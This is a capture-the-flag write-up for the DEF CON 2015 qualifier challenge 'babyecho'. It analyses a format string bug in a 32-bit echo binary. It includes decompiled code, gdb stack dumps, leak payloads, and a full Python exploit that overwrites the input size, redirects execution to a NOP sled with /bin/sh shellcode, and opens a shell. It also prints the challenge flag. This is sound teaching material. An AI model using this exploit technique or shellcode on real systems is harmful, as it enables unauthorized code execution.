# DEF CON Qualifier 2015: babyecho

**Category:** Baby's First
**Points:** 1
**Solves:** TODO
**Description:**

> babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me:3232
>
> [Download](http://downloads.notmalware.ru/babyecho_eb11fdf6e40236b1a37b7974c53b6c3d)


## Write-up

_This write-up is made by boogy of the on_est_pas_contents CTF team._

The binary is 32bit and striped:
```bash
$ file babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
babyecho_eb11fdf6e40236b1a37b7974c53b6c3d: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=c9a66685159ad72bd157b521f05a85e2e427f5ee, stripped
```
Fuzzing around with the binary before eaven reverse enginnering it, we sat that there is a format string vulnerability in the function that echos out the user input.
```bash
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
AAAA
AAAA
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p
0xd0xa(nil)0xd
```
The problem here is that the buffer only accepts 13 bytes of user input so it's not possible to craft a correct format string payload and overwrite stuff. We need to reverse engineer the function that takes the user input and find out where the size variable is.

I'll not paste all the functions here to save some space but here is the function which is important to us, that prints the user input:
```C
int __usercall sub_8048F3C@<eax>(int a1@<ebx>)
{
  int v1; // ecx@1
  signed int buffer_max_length; // eax@2
  int v3; // ecx@4
  int buffer_length; // [sp+10h] [bp-410h]@1
  int v7; // [sp+1Ch] [bp-404h]@4
  int v8; // [sp+41Ch] [bp-4h]@1

  v8 = *MK_FP(__GS__, 20);
  buffer_length = 13;                           // default buffer length is 13 bytes
  sub_804FC40(off_80EA4C0, 0, 2, 0);
  sub_804DE70(14, sub_8048EB1);
  sub_806CB50(v1, a1);
  while ( 1 )
  {
    buffer_max_length = 1023;                   // maximum length for the buffer
    if ( buffer_length <= 1023 )
      buffer_max_length = buffer_length;
    buffer_length = buffer_max_length;
    sub_804F560("Reading %d bytes\n", buffer_max_length);
    sub_8048E24((int)&v7, buffer_length, 10);
    sub_8048ECF((int)&v7);
    sub_804F560((const char *)&v7);
    sub_804FDE0(10);
    sub_806CB50(v3, a1);
  }
}
```
We can see that the size variable is by default 13 bytes. What is important to note is that the binary checks if the buffer length does not exceed 1023, which means that even if we rewrite the size we can't go more than 1023.

So how do we bypass the 13 bytes restriction and change it to the maximum size **1023**? Well with format strings you have a write what where condition. After some gdb foo we can see the stack layout:

So the stack looks like this:

* %1$x -> 0xd
* %2$x -> 0xa
* %3$x -> 0x0
* %4$x -> 0xd
* %5$x -> pointer to our buffer (first char in "AAAA" on the stack)
* %6$x -> 0x0
* %7$x -> start of our input "AAAA"

We can see this in gdb:

```bash
--------------------------------------------------------------------------[regs]
  EAX: 0x0000000D  EBX: 0x080481A8  ECX: 0x080EB4D4  EDX: 0x080481A8  o d I t S z A p C
  ESI: 0x00000000  EDI: 0x080EA00C  EBP: 0xFFFFD598  ESP: 0xFFFFD170  EIP: 0x08048FDB
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------[code]
=> 0x8048fdb:   call   0x804f560
   0x8048fe0:   mov    DWORD PTR [esp+0x8],0xa
   0x8048fe8:   mov    eax,DWORD PTR [esp+0x10]
   0x8048fec:   mov    DWORD PTR [esp+0x4],eax
   0x8048ff0:   lea    eax,[esp+0x1c]
   0x8048ff4:   mov    DWORD PTR [esp],eax
   0x8048ff7:   call   0x8048e24
   0x8048ffc:   lea    eax,[esp+0x1c]
--------------------------------------------------------------------------------
Breakpoint 1, 0x08048fdb in ?? ()
gdb$ x/32w $esp+4
0xffffd174:     0x0000000d      0x0000000a      0x00000000      0x0000000d
0xffffd184:     0xffffd18c      0x00000000      0x41414141      0x00000000
0xffffd194:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1a4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1b4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1c4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1d4:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd1e4:     0x00000000      0x00000000      0x00000000      0x00000000
gdb$ x/x 0xffffd18c
0xffffd18c:     0x41414141
```
We can also verify it by giving a **%p** to the binary as input to leak stack values:
```bash
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%p%p%p%p%p%p
0xd0xa(nil)0xd0xffffd18c(nil)
```
Or accessing directly the buffer address on the stack:
```bash
$ ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d
Reading 13 bytes
%5$p
0xffffd18c
```
The first **0xd** is 13 in hex so this is the buffer default length. So how can we override it ? That's simple, with the format strings we can leak the buffer address and then calculate the address of the size on the stack then we write to that address.

Here is the final exploit:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# p = remote("localhost", 1338)
p = remote("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232)
log.info(p.recvuntil("\n"))

#leak buffer address
p.sendline("%5$x")
buffer_address = int(p.recvuntil("\n"), 16)
log.info("Buffer is at %s" % hex(buffer_address))
log.info(p.recvuntil("\n"))

get_address = lambda i: buffer_address+4*(i-7)

# change buffer size to 1023==0x3ff
# buffer_address is 12 bytes after 0xd on the stack
p.sendline(p32(get_address(4)+1)+"%7$hhn") # buffer_address-0xc+1 => 0xd
p.recvuntil("\n")
log.info(p.recvuntil("\n"))

addr2write = get_address(-1)
addr0 = buffer_address+32
addr1 = hex((addr0 >>16)& 0xFFFF)
addr2 = hex(addr0 & 0xFFFF)

payload = str(p32(addr2write)) + str(p32(addr2write+2)) + \
        "%" + str(int(addr1, 16)-8) + "x%8$hn" + \
        "%" + str(int(addr2.replace('0x', '0x1'),16)-int(addr1,16)) + "x%7$hn" + "\x90"*100 + shellcode

log.info("Sending payload")
p.sendline(payload)
p.interactive()
```
> The format string payload could be easily generated with the libformatstr.

Running the exploit we get a shell
```bash
[+] Opening connection to localhost on port 1338: Done
[*] Reading 13 bytes
[*] Buffer is at 0xffb3d4ec
[*] Reading 13 bytes
[*] Reading 1023 bytes
[*] Sending payload
[*] Switching to interactive mode
...
$ cat /home/babyecho/flag
The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
```


## Other write-ups and resources

* <http://pastebin.com/TGuRLGCQ>
* <https://ctf-team.vulnhub.com/defcon-2015-quals-babyecho/>
* <http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/>
* [Korean](http://blackcon.tistory.com/121)
